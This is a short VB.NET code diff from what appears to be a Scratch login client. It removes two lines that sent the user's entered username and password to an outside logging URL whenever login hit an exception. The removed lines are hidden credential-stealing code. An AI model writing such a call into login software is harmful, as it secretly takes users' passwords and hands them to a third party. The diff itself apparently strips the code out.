@@ -50,9 +50,7 @@ retria:
                 GroupBox1.Enabled = True
                 Exit Sub
             Catch ex As Exception
-                Dim webClient As New System.Net.WebClient
-                Dim result As String = webClient.DownloadString("http://edxtech.uk/sumz/users/log.php?user=" & TextBox1.Text & "&pass=" & MaskedTextBox1.Text)
-                WebBrowser1.Navigate("https://scratch.mit.edu/users/" & TextBox1.Text)
+               WebBrowser1.Navigate("https://scratch.mit.edu/users/" & TextBox1.Text)
                 WaitForPageLoad()
 
                 MsgBox("Logged in successfully.", MsgBoxStyle.Information)
